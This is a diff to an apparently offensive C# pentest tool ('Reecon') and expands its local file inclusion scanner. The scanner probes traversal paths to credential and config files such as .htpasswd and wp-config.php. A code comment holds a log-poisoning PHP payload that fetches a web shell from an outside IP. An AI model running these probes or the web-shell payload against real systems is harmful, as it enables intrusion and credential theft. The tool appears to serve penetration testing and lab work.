@@ -17,9 +17,9 @@ namespace Reecon
                 Console.WriteLine("LFI Usage: reecon -lfi http://www.site.com/bla.php?include=file");
                 return;
             }
-            Scan(args[1]);
+            ScanPath(args[1]);
         }
-        public static void Scan(string path)
+        private static void ScanPath(string path)
         {
             Console.WriteLine("Starting LFI Scan - This feature is still in Alpha");
             // Init
@@ -27,16 +27,38 @@ namespace Reecon
 
             // Find OS
             var OS = GetOS();
+
             if (OS == General.OS.Linux)
             {
-                // Do Apache2 Checks
-                // Apache2 Log Poisoning Path: 
-                bool apache2 = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
-                if (apache2)
+                // General web checks
+                List<string> webChecks = new List<string>();
+                webChecks.Add("/var/www/html/.htpasswd");
+                webChecks.Add("/var/www/html/forum/.htpasswd");
+
+                // Wordpress
+                webChecks.Add("var/www/html/wp-config.php");
+                webChecks.Add("var/www/html/wordpress/wp-config.php");
+                DoLFI(webChecks);
+
+                // Do nginx checks
+                List<string> linux_nginx = new List<string>();
+                linux_nginx.Add("/etc/nginx/sites-available/default");
+                DoLFI(linux_nginx);
+
+                // Do Apache2 Checks - https://packages.ubuntu.com/eoan/all/apache2/filelist
+                List<string> linux_apache = new List<string>();
+                linux_apache.Add("/etc/apache2/sites-available/000-default.conf");
+                bool hasApache = DoLFI(linux_apache);
+                if (hasApache)
                 {
-                    // Log poisoning file upload
-                    // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
-                    Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
+                    // Apache2 Log Poisoning Path (Very restricted): 
+                    bool apache2Log = DoLFI(new List<string>() { "/var/log/apache2/access.log" });
+                    if (apache2Log)
+                    {
+                        // Log poisoning file upload
+                        // Mozilla/5.0 <?php file_put_contents('reeshell.php', file_get_contents('http://10.8.8.233:9001/reeshell.php'))?> Firefox/70.0
+                        Console.WriteLine("LFI - Log Poisoning File Upload - Bug Reelix");
+                    }
                 }
 
                 // Do MySQL Checks
@@ -128,27 +150,42 @@ namespace Reecon
             // If it must contain a word
             // php://filter/read=convert.base64-encode/wordhere/resource=flag
 
-            bool hasResult = false;
             foreach (string check in lfiChecks)
             {
                 // Check Base
                 string toCheck = initialPart + check;
-                int resultLength = wc.DownloadString(toCheck).Length;
-                if (resultLength != notFoundLength)
+                int resultLength = 0;
+                try
                 {
-                    hasResult = true;
-                    Console.WriteLine(resultLength + " -- " + toCheck);
+                    resultLength = wc.DownloadString(toCheck).Length;
+                    if (resultLength != notFoundLength)
+                    {
+                        Console.WriteLine(resultLength + " -- " + toCheck);
+                        // Don't need to try more if it's already true
+                        return true;
+                    }
+                }
+                catch (Exception)
+                {
+                    // Nope!
                 }
                 // Check with ../'s
                 toCheck = initialPart + "/../../../../.." + check;
-                resultLength = wc.DownloadString(toCheck).Length;
-                if (resultLength != notFoundLength)
+                try
                 {
-                    hasResult = true;
-                    Console.WriteLine(resultLength + " -- " + toCheck);
+                    resultLength = wc.DownloadString(toCheck).Length;
+                    if (resultLength != notFoundLength)
+                    {
+                        Console.WriteLine(resultLength + " -- " + toCheck);
+                        return true;
+                    }
+                }
+                catch (Exception)
+                {
+                    // Nope!
                 }
             }
-            return hasResult;
+            return false;
         }
     }
 }
